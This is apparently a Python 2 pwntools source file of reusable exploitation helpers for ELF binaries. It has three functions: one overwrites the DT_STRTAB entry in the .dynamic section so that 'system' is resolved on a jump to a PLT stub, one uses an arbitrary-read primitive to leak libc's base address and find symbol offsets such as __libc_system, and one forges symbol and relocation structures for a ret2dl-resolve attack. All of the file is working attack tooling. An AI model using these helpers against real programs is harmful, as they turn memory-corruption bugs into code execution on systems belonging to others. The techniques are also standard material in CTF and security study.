from traceback import print_exc

import itertools
from pwn import *
from pwnlib.log import warning


def change_dynstr_exploit(elf_file, write_to_address, jump_to_address, rw_permit_address, function_name='system\x00',
                          load_base=None, address_bad_chars='', string_bad_chars='', verbose=False):
    """
    Use when you have (ELF file, {Radom write vulnerability, Random jump vulnerability} in one session).
    If libc funtion argument is needed, put before call this or put that in jump_to_address.
    If Elf is PIE, EBX register must be set as address of .got.plt before this or in jump_to_address.
    :param elf_file: target binary file.
    :param rw_permit_address: any writable memory address in target program.
    :param verbose: if true, print processes.
    :param string_bad_chars: bad bytes for input to target program.
    :param address_bad_chars: bad bytes for address.
    :param function_name: symbol name you want to resolve.
    :param write_to_address: write_to_address(address, value_as_str) - arbitrary write function
    :param jump_to_address: jump_to_address(address) - arbitrary jump function
    :param load_base: give me if target is aslr.
    """

    if not isinstance(elf_file, ELF):
        e = elf_file
    else:
        e = ELF(elf_file)
    if e.arch == 'x86':
        is_x64 = False
    elif e.arch == 'amd64':
        is_x64 = True
    else:
        raise NotImplementedError('Architecture {} is not implemented yet.'.format(repr(e.arch)))

    address_bits = 64 if is_x64 else 32
    if load_base is None:
        if e.pie:
            raise PwnlibException('This executable is PIE. load base address is needed.')
        base = e.load_addr
    else:
        if not e.pie:
            warning("This executable has its own load address. Ignoring parameter 'load_address'.")
            base = e.load_addr
        else:
            base = load_base
    dynamic = e.get_section_by_name('.dynamic')
    dynamic_address = dynamic.header.sh_addr + (base if e.pie else 0)
    for i, tag in enumerate(dynamic.iter_tags()):
        if tag.entry.d_tag == 'DT_STRTAB':
            strtab_address = dynamic_address + (address_bits / 8 * 2) * i + (address_bits / 8)
            break
    else:
        raise PwnlibException("There's no tag named 'DT_STRTAB' in .dynamic section.")
    some_symbol = next(s for s in e.get_section_by_name('.dynsym').iter_symbols()
                       if s.entry.st_info.type == 'STT_FUNC')
    symbol_name = some_symbol.name
    symbol_name_offset = some_symbol.entry.st_name

    address_bad_chars = map(ord, address_bad_chars)
    string_bad_chars = map(ord, string_bad_chars)

    for byte_order in xrange(0, address_bits, 8):
        for _ in xrange(0x100):
            if (((rw_permit_address >> byte_order) & 0xff) in address_bad_chars) or \
                    (((rw_permit_address - symbol_name_offset >> byte_order) & 0xff) in string_bad_chars):
                rw_permit_address += (1 << byte_order)
            else:
                break
        else:
            raise PwnlibException('Unable to avoid bad charactors in rw space address.')
    if verbose:
        print '&"system" = {:#x}'.format(rw_permit_address)
        print '&"system" - name_offset = {:#x}'.format(rw_permit_address - symbol_name_offset)
        print 'strtab = {:#x}'.format(strtab_address)

    for c in map(ord, pack(strtab_address, address_bits)):
        if c in address_bad_chars:
            raise PwnlibException('There are bad charactors in strtab tag address. ({:#x})'.format(strtab_address))

    write_to_address(rw_permit_address, function_name)
    try:
        write_to_address(strtab_address,
                         pack(rw_permit_address - symbol_name_offset, address_bits)
                         )
    except:
        print_exc()
        raise PwnlibException(
            'Got exception while overwriting STRTAB address in .dynamic section. No WRITE permission?')
    jump_to_address(e.plt[symbol_name] + (base if e.pie else 0))


def massive_leak_search(get_address_of_some_point_in_libc, leak_address, symbols_to_find=('__libc_system',),
                        is_x64=False, no_null_byte_in_address=False, by_dynamic_entries=True, lib_base=None,
                        lib_base_is_before=0, entry_point=None, phoff=None, dynamic=None, shoff=None, symtab=None):
    """
    Use when you have ({leaked address of somewhere in libc + Random read vulnerability} in one session,
                        {leaked address of that point in libc + Random jump vulnerability} in one session).
    Memory layout should be kept from every call of get_address_of_some_point_in_libc()
     to next call of leak_address()
    :param symbols_to_find: symbol names you want to find.
    :param get_address_of_some_point_in_libc: function to give an virtual address of certain offset in the library.
    :param leak_address: leaked_string = leak_address(address)
    :param is_x64: true => x64, false => x86
    :param no_null_byte_in_address: if true we do not send inputs that include address with null bytes.
    :param by_dynamic_entries: find symtab and strtab offsets by reading dynamic entries, not section header.
    :param lib_base: give me if you have executed this and know base offset.
    :param lib_base_is_before: give me if you are aborted while finding base.
    :param entry_point: give me if you know library entry point.
    :param phoff: give me if you know program header offset.
    :param shoff: give me if you know section header offset.
    :param dynamic: give me if you know dynamic section offset.
    :param symtab: give me if you know symtab offset.
    :return: tuple(found_offsets=dict{'<name>': 0xoffset}, base_from_aligned_point=<int>)
    """
    # address size in bits and bytes
    address_bits = 64 if is_x64 else 32
    address_size = address_bits / 8
    base_candidate = lib_base_is_before & (~0xfff)

    # arg1 will be function or value?
    if not callable(get_address_of_some_point_in_libc):
        point = get_address_of_some_point_in_libc

        def get_address_of_some_point_in_libc():
            return point

    # handle null byte
    if no_null_byte_in_address:
        base_candidate += 1
    if lib_base is None:
        # find base address
        print 'Finding library base'
        while True:
            try:
                target_address = (get_address_of_some_point_in_libc() & (~0xfff)) + base_candidate
                if no_null_byte_in_address:
                    if (target_address & 0xff00) == 0x0000:
                        warning('Skipped {:#x}({:#x}). If you are suspicious about here, try again.'
                                .format(base_candidate, target_address))
                        base_candidate -= 0x1000
                        continue
                    elif '\x00' in pack(target_address, address_bits).rstrip('\x00'):
                        raise PwnlibException(
                            "There's null byte that is not rightmost 2 bytes. {:#x} Try again.".format(target_address))
                leaked = leak_address(target_address)
                print 'Leaked {:+#04x}({:#x}): {}'.format(base_candidate, target_address, repr(leaked)),
            except:
                print_exc()
                raise PwnlibException('Failed to read {:#x}.'.format(target_address))
            if no_null_byte_in_address:
                if leaked.startswith('ELF'):
                    base_from_aligned_point = base_candidate - 1
                    print ' <-- ELF header!'
                    break
            else:
                if leaked.startswith('\x7fELF'):
                    base_from_aligned_point = base_candidate
                    print ' <-- ELF header!'
                    break
            print
            base_candidate -= 0x1000
        print '\n========================================================'
        print 'Base found: align_0x1000(given point){:+#x}'.format(base_from_aligned_point)
    else:
        base_from_aligned_point = lib_base

    def make_libc_address(offset, return_with_base_addr=False):
        base_addr = (get_address_of_some_point_in_libc() & (~0xfff)) + base_from_aligned_point
        if return_with_base_addr:
            return base_addr + offset, base_addr
        else:
            return base_addr + offset

    def read_n_bytes(offset, n):
        value = ''
        read_position = 0
        while read_position < n:
            value_part = leak_address(make_libc_address(offset + read_position))
            read_position += len(value_part)
            value += value_part
        return value

    if entry_point is None:
        # find entry point offset
        e_entry_bytes = read_n_bytes(0x18, address_size)
        e_entry = unpack(e_entry_bytes[:address_size], address_bits)
        print 'Entry point: base + {:#x}'.format(e_entry)
    else:
        e_entry_bytes = ''
        e_entry = entry_point

    if by_dynamic_entries:
        if phoff is None:
            # find program header offset
            if is_x64:
                e_phoff_bytes = e_entry_bytes[8:]
                e_phoff_bytes += read_n_bytes(0x20 + len(e_phoff_bytes), 8 - len(e_phoff_bytes))
                e_phoff = unpack(e_phoff_bytes[:8], 64)
            else:
                e_phoff_bytes = e_entry_bytes[4:]
                e_phoff_bytes += read_n_bytes(0x1c + len(e_phoff_bytes), 4 - len(e_phoff_bytes))
                e_phoff = unpack(e_phoff_bytes[:4], 32)
            print 'Program header offset: base + {:#x}'.format(e_phoff)
        else:
            e_phoff = phoff

        # find dynamic section offset. check ProgramHeader[4] first.
        if dynamic is None:
            if is_x64:
                p_type = read_n_bytes(e_phoff + 0x38 * 4, 1)
                if p_type.rstrip('\x00') != '\x02':
                    print "ProgramHeader[4] is not 'DYNAMIC'. Also looking the others."
                    for i in xrange(2, 16):
                        if i == 4:
                            continue
                        p_type = read_n_bytes(e_phoff + 0x38 * i, 8)
                        if p_type.rstrip('\x00') == '\x02':
                            print "'DYNAMIC' is at ProgramHeader[{}].".format(i)
                            break
                    else:
                        raise PwnlibException("There's no 'DYNAMIC' in ProgramHeader[2:16].")
                else:
                    print "'DYNAMIC' is at ProgramHeader[4]."
                dynamic_offset_bytes = read_n_bytes(e_phoff + 0x38 * 4 + 16, 8)
                dynamic_offset = unpack(dynamic_offset_bytes[:8], 64)
            else:
                dynamic_offset_bytes = read_n_bytes(e_phoff + 0x20 * 4 + 8, 4)
                dynamic_offset = unpack(dynamic_offset_bytes[:4], 32)
            print '.dynamic offset: base + {:#x}'.format(e_phoff)
        else:
            dynamic_offset = dynamic

        def read_difference_from_base(offset):
            start_position = 0
            read_position = 0
            value = ''
            subtract = 0
            while read_position < address_size:
                addr, base_addr = make_libc_address(offset + start_position, True)
                value_part = leak_address(addr)
                part_length = len(value_part)
                # append part of base address which is corresponding to leaked part.
                # there can be arithmetic carry error. But since possibility is relatively low,
                #  if suspicious, try again.
                subtract |= ((base_addr >> (start_position * 8)) & ((1 << (part_length * 8)) - 1))
                read_position += part_length
                value += value_part
            return unpack(value[:address_size], address_bits) - (subtract & ((1 << address_bits) - 1))

        # find strtab and symtab offset. assuing they're in dynamic[7] and dynamic[8].
        strtab_index = None
        symtab_index = None
        if is_x64:
            tag = read_n_bytes(dynamic_offset + 0x10 * 7, 1)
            if tag.rstrip('\x00') == '\x05':
                strtab_index = 7
                print "'strtab' is at DYNAMIC[7]."
            else:
                print "DYNAMIC[7](tag={}) is not 'strtab'. Also looking the others.".format(repr(tag))
            tag = read_n_bytes(dynamic_offset + 0x10 * 8, 1)
            if tag.rstrip('\x00') == '\x06':
                symtab_index = 8
                print "'symtab' is at DYNAMIC[8]."
            else:
                print "DYNAMIC[8](tag={}) is not 'symtab'. Also looking the others.".format(repr(tag))
            for i in xrange(0, 256):
                if strtab_index is not None and symtab_index is not None:
                    break
                if i == 7 or i == 8:
                    continue
                tag = read_n_bytes(dynamic_offset + 0x10 * i, 1).rstrip('\x00')
                print 'DYNAMIC[{}].d_tag = {}'.format(i, repr(tag))
                if strtab_index is None and tag == '\x05':
                    strtab_index = i
                    print "'strtab' is at DYNAMIC[{}].".format(i)
                elif symtab_index is None and tag == '\x06':
                    symtab_index = i
                    print "'symtab' is at DYNAMIC[{}].".format(i)
                    symtab_offset = read_difference_from_base(dynamic_offset + 0x10 * symtab_index + 8)
                    print 'symtab offset: base + {:#x}'.format(symtab_offset)
            else:
                raise PwnlibException("There's no 'strtab' and/or 'symtab' in 'DYNAMIC[0:256]'.")

            strtab_offset = read_difference_from_base(dynamic_offset + 0x10 * strtab_index + 8)
            symtab_offset = read_difference_from_base(dynamic_offset + 0x10 * symtab_index + 8)
        else:
            strtab_offset = read_difference_from_base(dynamic_offset + 0x8 * 7 + 4)
            symtab_offset = read_difference_from_base(dynamic_offset + 0x8 * 8 + 4)
    else:
        if shoff is None:
            # find section header offset
            if is_x64:
                e_shoff_bytes = read_n_bytes(0x28, 8)
                e_shoff = unpack(e_shoff_bytes[:8], 64)
            else:
                e_shoff_bytes = read_n_bytes(0x20, 4)
                e_shoff = unpack(e_shoff_bytes[:4], 32)
        else:
            e_shoff = shoff
        # find symtab and strtab offset
        print 'Section header offset: base + {:#x}'.format(e_shoff)
        if is_x64:
            symtab_bytes = read_n_bytes(e_shoff + 0x40 * 4 + 0x10, 8)
            symtab_offset = unpack(symtab_bytes[:8], 64)
            strtab_bytes = read_n_bytes(e_shoff + 0x40 * 5 + 0x10, 8)
            strtab_offset = unpack(strtab_bytes[:8], 64)
        else:
            symtab_bytes = read_n_bytes(e_shoff + 0x28 * 4 + 0xc, 4)
            symtab_offset = unpack(symtab_bytes[:4], 32)
            strtab_bytes = read_n_bytes(e_shoff + 0x28 * 5 + 0xc, 4)
            strtab_offset = unpack(strtab_bytes[:4], 32)

    print 'strtab offset: base + {:#x}'.format(strtab_offset)
    print 'symtab offset: base + {:#x}'.format(symtab_offset)

    # leak content of strtab until find all target symbol names.
    symbols_to_find = set(symbols_to_find)
    strtab = dict()
    target_st_name_by_string = dict()

    strtab_position = 0
    string_start = 0
    leaked_string = ''
    print '\nFinding strtab offsets of strings {}'.format(list(symbols_to_find))
    while not symbols_to_find.issubset(target_st_name_by_string.keys()):
        while '\x00' not in leaked_string:
            leaked_string_part = leak_address(make_libc_address(strtab_offset + strtab_position))
            strtab_position += len(leaked_string_part)
            leaked_string += leaked_string_part
        null_index = leaked_string.index('\x00')
        strtab[string_start] = leaked_string[:null_index]
        print 'Reading strtab[{:#x}] = {}'.format(string_start, repr(strtab[string_start])),
        if strtab[string_start] in symbols_to_find:
            print ' <-- Found target!'
            target_st_name_by_string[strtab[string_start]] = string_start
        else:
            print
        string_start += null_index + 1
        leaked_string = leaked_string[null_index + 1:]

    found_offsets = dict()

    sym_size = 24 if is_x64 else 16
    st_value_offset = 8 if is_x64 else 4
    symtab_index = 0

    print "\nFinding sym's with st_name's {}".format(target_st_name_by_string.values())
    while target_st_name_by_string:
        st_name_bytes = read_n_bytes(symtab_offset + sym_size * symtab_index, 4)
        st_name = unpack(st_name_bytes[:address_size], address_bits)
        try:
            st_name_string = strtab[st_name]
        except KeyError:
            st_name_string = '(Not fetched)'
        print 'Reading symtab[index {:#x}].st_name = {}'.format(symtab_index, st_name_string),
        if st_name in target_st_name_by_string.values():
            st_value_bytes = st_name_bytes[4:]
            st_value_bytes += read_n_bytes(
                symtab_offset + sym_size * symtab_index + st_value_offset - len(st_value_bytes),
                address_size - len(st_value_bytes)
            )
            st_value = unpack(st_value_bytes[:address_size], address_bits)
            found_offsets[strtab[st_name]] = st_value
            print ' <-- {} Search succeeded. Its offset is {:#x} '.format(repr(strtab[st_name]), st_value)
            del target_st_name_by_string[strtab[st_name]]
        else:
            print
        symtab_index += 1

    print '\nResult:'
    print 'Base: align_0x1000(given point){:+#x}'.format(base_from_aligned_point)
    for symbol, offset_value in found_offsets.iteritems():
        print '{}: {:#x}'.format(symbol, offset_value)

    return found_offsets, base_from_aligned_point


def fake_sym_exploit(elf_file, address_of_function_name, load_base=None):
    """
    Use when you (have ELF file, can write two strings somewhere and know their addresses,
     can put address on the top of the stack, have random jump vulnerability).
    :param elf_file: target binary file.
    :param address_of_function_name: any address that contains function name you want to execute.
    :param load_base: give me if elf_file is aslr.
    """
    if isinstance(elf_file, ELF):
        e = elf_file
    else:
        e = ELF(elf_file)
    if e.arch == 'x86':
        is_x64 = False
    elif e.arch == 'amd64':
        is_x64 = True
    else:
        raise NotImplementedError('Architecture {} is not implemented yet.'.format(repr(e.arch)))

    address_bits = 64 if is_x64 else 32
    if load_base is None:
        if e.pie:
            raise PwnlibException('This executable is PIE. load base address is needed.')
        base = e.load_addr
    else:
        if not e.pie:
            warning("This executable has its own load address. Ignoring parameter 'load_address'.")
            base = e.load_addr
        else:
            base = load_base
    dynamic = e.get_section_by_name('.dynamic')
    dynamic_address = dynamic.header.sh_addr + (base if e.pie else 0)

    strtab_address = None
    symtab_address = None
    for i, tag in enumerate(dynamic.iter_tags()):
        if tag.entry.d_tag == 'DT_STRTAB':
            strtab_address = dynamic_address + (address_bits / 8 * 2) * i + (address_bits / 8)
        if tag.entry.d_tag == 'DT_SYMTAB':
            symtab_address = dynamic_address + (address_bits / 8 * 2) * i + (address_bits / 8)
        if strtab_address is not None and symtab_address is not None:
            break
    else:
        raise PwnlibException("There're no tags named 'DT_STRTAB' and 'DT_SYMTAB' in .dynamic section.")
    st_name = address_of_function_name - strtab_address
    if st_name < 0 or 0xffffffff < st_name:
        raise PwnlibException(
            'address_of_function_name - strtab_address is not in uint32 range({:#x} - {:#x} = {:#x})'
                .format(address_of_function_name, strtab_address, st_name))
    fake_sym = pack(st_name, 32)
    if is_x64:
        fake_sym += pack(0b11111100, 8) + 'A' * (1 + 2 + 8 + 8)
    else:
        fake_sym += 'A' * (4 + 4 + 4 + 1) + pack(0b11111100, 8) + 'A' * 2

    def make_fake_rel(fake_sym_address, rw_permission_address=None):
        if rw_permission_address is None:
            data = e.get_section_by_name('.data')
            if data is None:
                raise PwnlibException("There's no '.data' section. give an rw_permission_address.")
            if data.header.sh_size < (24 if is_x64 else 16):
                raise PwnlibException("'.data' section is too small. give an rw_permission_address.")
            rw_permission_address = data.header.sh_addr + (base if e.pie else 0)
        fake_rel = pack(rw_permission_address, address_bits)
        if is_x64:
            if (fake_sym_address - symtab_address) < 0 or (fake_sym_address - symtab_address) % 0x18 != 0:
                raise PwnlibException("fake_sym_address must aligned to symtab(={:#x}) + n*0x18".format(symtab_address))
            r_info = ((fake_sym_address - symtab_address) / 24) << 32
            r_info |= 0x41414141  # padding
            fake_rel += pack(r_info, 64)
        else:
            if (fake_sym_address - symtab_address) < 0 or (fake_sym_address - symtab_address) % 0x10 != 0:
                raise PwnlibException("fake_sym_address must aligned to symtab(={:#x}) + n*0x10".format(symtab_address))
            r_info = ((fake_sym_address - symtab_address) / 16) << 8
            r_info |= 0x41  # padding
            fake_rel += pack(r_info, 32)
        return fake_rel
    return fake_sym, make_fake_rel
